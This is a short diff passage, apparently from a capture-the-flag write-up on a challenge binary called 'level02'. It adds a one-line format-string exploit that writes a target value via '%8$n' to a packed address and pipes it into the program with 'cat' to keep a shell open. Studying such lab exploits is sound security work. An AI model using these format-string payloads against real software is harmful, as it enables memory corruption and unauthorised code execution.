@@ -127,6 +127,9 @@ so %4196997d%8$n
 
 (python -c 'print "%4196997d" + "%8$n"' ; python -c 'print "\x28\x12\x60"'; cat) | ./level02
 
+
+(python -c 'print "%4196997d%8$n\n\x28\x12\x60"'; cat) | ./level02
+
 USER INPUT
      │
      ▼
